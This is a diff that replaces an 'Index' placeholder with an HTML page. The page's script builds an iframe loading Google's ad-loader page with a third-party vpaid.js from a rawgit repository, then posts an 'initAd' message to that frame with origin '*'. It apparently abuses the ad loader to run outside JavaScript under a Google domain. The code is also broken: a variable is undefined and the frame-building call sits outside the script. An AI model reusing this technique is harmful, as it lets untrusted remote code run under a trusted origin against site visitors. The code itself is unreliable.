@@ -1,1 +1,32 @@
-Index
+<html  style="margin: 0px;">
+
+        <head>
+
+        </head>
+
+        <body style="margin: 0px;">
+
+        <script>
+
+                function quStart(){
+
+                        setTimeout(function(){document.getElementById('twitter').contentWindow.postMessage('{"desiredBitrate":-1,"creativeData":"https://googleads.github.io/googleads-ima-html5/media/LinearVPAIDCreative.mp4","viewMode":"normal","clickThroughUrl":"http://google.com","adUrl":"https://tpc.googlesyndication.com/pagead/js/loader15.html?https://rawgit.com/coolboy112233/unknowbastard/master/vpaid.js?r=15&ai=' + newstr + '","volume":0,"session":"goog_678072542","type":"initAd"}','*');},10);
+
+
+                }
+
+    function prepareFrame() {
+        var ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", "https://tpc.googlesyndication.com/pagead/js/loader15.html?https://rawgit.com/coolboy112233/unknowbastard/master/vpaid.js?r=15&ai=" + newstr);
+        ifrm.onload="setTimeout(function(){quStart();},1000);";
+        ifrm.id = "twitter";
+        ifrm.style="margin:0px;border:0px;height:300px;width:400px;max-height:300px;max-width:400px;"
+        document.body.appendChild(ifrm);
+    }
+
+        </script>
+
+        prepareFrame();
+        </body>
+
+        </html>
